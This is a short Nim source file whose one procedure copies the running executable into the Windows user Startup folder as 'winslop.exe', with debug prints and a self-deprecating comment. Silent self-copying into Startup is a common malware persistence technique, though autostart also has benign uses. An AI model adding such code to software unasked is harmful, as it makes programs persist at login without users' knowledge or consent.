import std/[os, osproc]
proc copyToStartup() =
  let originBinary = getAppFilename()
  let roamingPath = getEnv("APPDATA")

  
  let startupPath = getEnv("APPDATA") / r"Microsoft\Windows\Start Menu\Programs\Startup\winslop.exe"

  try:
    copyFile(originBinary, startupPath)
    echo "Startuppp ", startupPath
  except OSError as e:
    echo "error 107: ", e.msg
#I admit this method is a bit daft, but it’ll do for now 